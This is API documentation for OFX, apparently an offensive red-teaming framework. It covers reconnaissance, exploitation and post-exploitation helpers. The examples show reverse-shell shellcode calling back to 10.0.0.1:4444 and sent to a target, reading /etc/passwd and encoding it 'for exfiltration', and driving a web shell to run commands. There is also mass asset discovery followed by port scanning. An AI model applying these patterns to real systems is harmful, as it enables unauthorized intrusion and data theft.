# API Overview

OFX provides comprehensive red teaming APIs to reduce scripting overhead by 80-90%.

## Categories

### :material-radar: Reconnaissance

Search engines, port scanning, service grabbing, DNS resolution, and subdomain enumeration.

| API | Purpose | Example |
|-----|---------|---------|
| **Fofa** | Asset discovery via Fofa search | `fofa.search('app="Apache"')` |
| **Shodan** | Internet-wide scanning search | `shodan.search('apache')` |
| **ZoomEye** | Cyberspace search engine | `zoomeye.search('apache')` |
| **CEye** | OOB DNS/HTTP callback testing | `ceye.build_request('data')` |
| **Interactsh** | OOB interaction testing | `interactsh.register()` |
| **PHTTPServer** | Payload hosting with SSL | `server.start(daemon=True)` |
| **PortScanner** | Fast port discovery | `scanner.scan()` |
| **ServiceGrabber** | Banner grabbing | `grabber.grab_banner()` |
| **DNSResolver** | DNS record enumeration | `resolver.query('example.com')` |
| **SubdomainEnumerator** | Subdomain discovery | `enum.enumerate()` |

### :material-bug: Exploitation

Binary analysis, payload building, process execution, and network utilities.

| API | Purpose | Example |
|-----|---------|---------|
| **RemoteTarget** | Socket connections | `with RemoteTarget(host, port) as r:` |
| **BinaryAnalyzer** | Security property analysis | `analyzer.check_pie()` |
| **PayloadBuilder** | Shellcode generation | `builder.build_shellcode()` |
| **ProcessRunner** | Local execution | `runner.execute()` |
| **ShellcodeGenerator** | Platform-specific shellcode | `gen.generate('linux', 'x64')` |

### :material-key: Post-Exploitation

File operations, process management, cryptography, and credential handling.

| API | Purpose | Example |
|-----|---------|---------|
| **FileUtils** | File operations | `FileUtils.read_file(path)` |
| **ProcessUtils** | Command execution | `ProcessUtils.run_command(cmd)` |
| **CryptoUtils** | Hashing and encoding | `CryptoUtils.md5(data)` |
| **DataTransformer** | Format conversion | `transformer.to_json(data)` |
| **CredentialManager** | Secure credential storage | `manager.store(key, value)` |

## Quick Start

### Reconnaissance Example

```python
from ofx.api import Fofa, PortScanner

# Asset discovery
fofa = Fofa(user="email@example.com", token="your_token")
targets = fofa.search('app="Apache" && country="US"', pages=2)

# Port scanning
for target in targets['results'][:10]:
    scanner = PortScanner(target=target['ip'], ports='80,443,8080')
    open_ports = scanner.scan()
    print(f"{target['ip']}: {open_ports}")
```

### Exploitation Example

```python
from ofx.api import RemoteTarget, PayloadBuilder

# Build payload
payload = PayloadBuilder.build_shellcode(
    arch='x64',
    platform='linux',
    payload_type='reverse_shell',
    lhost='10.0.0.1',
    lport=4444
)

# Send to target
with RemoteTarget(host='target.com', port=9999) as remote:
    remote.send(payload)
    response = remote.recv()
```

### Post-Exploitation Example

```python
from ofx.api import FileUtils, CryptoUtils

# Read sensitive file
data = FileUtils.read_file('/etc/passwd')

# Hash for verification
hash_value = CryptoUtils.sha256(data)

# Encode for exfiltration
encoded = CryptoUtils.base64_encode(data)
```

## Next Steps

### View API Documentation

Use the built-in API documentation command to explore all available APIs:

```bash
# List all API modules
ofx docs api --list

# View detailed documentation for a specific module
ofx docs api --module webshell
ofx docs api --module http
ofx docs api --module file

# View specific function or class details
ofx docs api --module webshell --function WebShell
ofx docs api --module http --function fetch
```

### API Usage in Workflows

All APIs can be used directly in your workflow steps:

```yaml
name: api-example
description: Using OFX APIs in workflows

jobs:
  recon:
    steps:
      - name: Use HTTP API
        language: python
        script: |
          from ofx.api import http
          
          response = http.fetch("https://api.target.com")
          print(response)
      
      - name: Use WebShell API
        language: python
        script: |
          from ofx.api import webshell
          
          shell = webshell.WebShell(
              url="${{ inputs.shell_url }}",
              param="cmd"
          )
          result = shell.execute("whoami")
          print(result)
```

### Common API Patterns

**HTTP Requests:**
```python
from ofx.api import http

# GET request
response = http.fetch("https://api.example.com/data")

# POST request
data = http.post("https://api.example.com/submit", 
                 data={"key": "value"})
```

**File Operations:**
```python
from ofx.api import file

# Read file
content = file.read("results.txt")

# Write file
file.write("output.txt", "data")

# Check if exists
if file.exists("config.json"):
    config = file.read("config.json")
```

**String Manipulation:**
```python
from ofx.api import strings

# Encode/decode
encoded = strings.base64_encode("data")
decoded = strings.base64_decode(encoded)

# URL operations
encoded_url = strings.url_encode("param=value&test=1")
```

For complete API reference with parameters, return types, and examples, use:
```bash
ofx docs api --module <module_name>
```
